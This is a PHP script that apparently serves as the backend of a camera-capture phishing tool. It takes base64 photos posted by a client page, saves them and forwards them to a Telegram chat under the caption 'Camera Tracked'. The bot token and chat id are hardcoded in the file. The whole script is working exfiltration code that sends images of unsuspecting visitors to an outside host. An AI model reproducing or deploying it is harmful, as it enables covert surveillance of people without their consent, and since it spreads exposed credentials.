<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $photo = $_POST['photo'];
    $chat_id = isset($_POST['id']) ? $_POST['id'] : '7467384643'; // Default chat_id if id is not set
    $bot_token = '8165742842:AAHPFR2jvcXmkhCNYH2MBtlufF_8O0oejUk';

    // Decode the base64 encoded photo
    $photo_data = explode(',', $photo);
    $photo_data = base64_decode($photo_data[1]);

    // Create a unique filename
    $filename = 'photo_' . time() . '.png';

    // Save the photo to the 'photos' folder
    file_put_contents('photos/' . $filename, $photo_data);

    // Send the photo to the Telegram chat
    $telegram_url = "https://api.telegram.org/bot$bot_token/sendPhoto";
    $post_fields = array(
        'chat_id' => $chat_id,
        'photo'   => new CURLFile('photos/' . $filename),
        'caption' => '<b><u>📸 Camera Tracked</u></b>',
        'parse_mode' => 'HTML',
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Type:multipart/form-data"
    ));
    curl_setopt($ch, CURLOPT_URL, $telegram_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    $response = curl_exec($ch);
    $response_data = json_decode($response, true);
    curl_close($ch);

    if (isset($response_data['ok']) && $response_data['ok'] === true) {
        // Delete the photo from the folder
        unlink('photos/' . $filename);
        echo json_encode(['status' => 'success']);
    } else {
        echo json_encode(['status' => 'fail', 'message' => 'Failed to send photo to Telegram']);
    }
} else {
    echo json_encode(['status' => 'fail', 'message' => 'Invalid request']);
}
?>